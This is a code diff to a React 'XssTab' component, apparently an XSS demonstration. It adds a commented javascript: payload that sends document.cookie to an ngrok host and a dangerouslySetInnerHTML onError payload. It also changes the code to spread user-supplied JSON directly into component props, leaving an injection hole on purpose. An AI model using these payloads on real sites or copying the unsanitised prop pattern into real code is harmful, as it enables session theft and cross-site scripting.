@@ -1,6 +1,9 @@
 import React, { useState } from "react";
 import { Input, Button } from 'reakit'
 
+// javascript:fetch('https://9432-161-22-31-212.ngrok-free.app/images/'+document.cookie, {method: "get", headers: new Headers({"ngrok-skip-browser-warning": "69420"})})
+// {"style":{ "backgroundColor": "red", "width": "100px", "height": "100px"}, "dangerouslySetInnerHTML": { "__html": "<img src='a.com' onError='{alert(1)}' />" }}
+
 export const XssTab = () => {
   const [value, setValue] = useState('')
   const [customizedBackground, setCustomizedBackground] = useState('{ "style": { "backgroundColor": "red", "width": "100px", "height": "100px"}}')
@@ -10,7 +13,7 @@ export const XssTab = () => {
     
     try {
       const parsedJson = JSON.parse(customizedBackground);
-      setBackgroundProps({style: parsedJson.style});
+      setBackgroundProps(parsedJson);
     } catch (e) {
       console.error(e)
       setBackgroundProps(undefined)
